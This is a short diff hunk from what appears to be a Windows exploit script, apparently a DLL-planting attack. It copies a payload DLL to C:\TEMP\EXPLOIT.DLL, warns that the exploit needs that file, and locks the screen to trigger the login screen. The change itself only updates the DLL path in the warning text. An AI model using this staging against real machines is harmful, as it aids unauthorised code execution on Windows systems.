@@ -10,9 +10,9 @@ run XCOPY PAYLOAD64.DLL C:\TEMP\EXPLOIT.DLL*
 
 # Print a warning if that didnt work.
 repeat rc print
-repeat rc print !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
-repeat rc print !!! THIS EXPLOIT REQUIRES C:\WINDOWS\TEMP\EXPLOIT.DLL TO EXIST !!!
-repeat rc print !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+repeat rc print !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+repeat rc print !!! THIS EXPLOIT REQUIRES C:\TEMP\EXPLOIT.DLL TO EXIST !!!
+repeat rc print !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
 repeat rc print
 print
 print The screen will lock to trigger the login screen in 5 seconds...
